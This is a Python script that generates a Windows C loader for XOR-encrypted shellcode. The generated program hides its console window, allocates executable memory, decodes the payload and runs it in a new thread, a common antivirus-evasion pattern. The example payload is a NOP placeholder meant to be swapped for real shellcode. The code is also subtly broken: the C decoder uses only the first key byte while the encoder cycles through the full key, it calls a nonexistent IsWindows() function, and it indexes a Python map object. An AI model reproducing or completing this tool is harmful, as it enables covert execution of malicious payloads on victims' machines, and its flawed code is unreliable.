#!/usr/bin/python
# Importing necessary libraries
import random 
import string
import argparse
from Crypto.Hash import MD5
import os

# Function to generate random strings
def rand():
    return random.choice(string.ascii_lowercase) + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))

# Function to xor encrypt data with a key
def xor(data, key):
    l = len(key)
    keyAsInt = map(ord, key)
    return bytes(bytearray((
        (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
    )))

# Function to write encrypted shellcode to a file and generate executable code
def writetofile(data, key, cipherType, lport):
    shellcode = "\\x" + "\\x".join(format(ord(b), '02x') for b in data)
    Filename = "./result/final_" + lport + ".c"
    if shellcode is not None:
        try:
            f = open(Filename, "w+")
            f.write("#include <windows.h>\n#include <stdio.h>\n\n")
            f.write("int main () { \n HWND hWnd = GetConsoleWindow();\nShowWindow(hWnd, SW_HIDE);\nHINSTANCE DLL = LoadLibrary(TEXT(\"shellcode.dll\"));\nif (DLL != NULL) {\nreturn 0;}\n")
            f.write("char shellcode[] = \"" + shellcode + "\"; ")  # Stores shellcode as a string
            f.write("char key[] = \"" + key + "\";")  # Key for xor encryption
            f.write("void *buf = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);")  # Allocates memory for payload
            f.write("memcpy(buf, shellcode, sizeof shellcode);")  # Copies payload to allocated memory
            f.write("char *p = (char *)buf;\nwhile (*p) { *p ^= key[0]; p++; }\nCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);")  # Create thread to execute payload
            f.write("while (1) {\n if (!IsWindows()) { return 0; }\n}\n}")
            f.close()
        except IOError:
            print("[!] Could not write C++ code [{}]".format(Filename))

# Function to generate and encrypt shellcode
def generate_and_encrypt_shellcode(shellcode, cipherType, lport):
    key = rand()
    encrypted_shellcode = xor(shellcode, key)
    writetofile(encrypted_shellcode, key, cipherType, lport)

# Example usage
if __name__ == "__main__":
    # Example shellcode (replace with actual shellcode)
    shellcode = b"\x90\x90\x90\x90"  # NOP sled for demonstration
    cipherType = "xor"
    lport = "1234"

    generate_and_encrypt_shellcode(shellcode, cipherType, lport)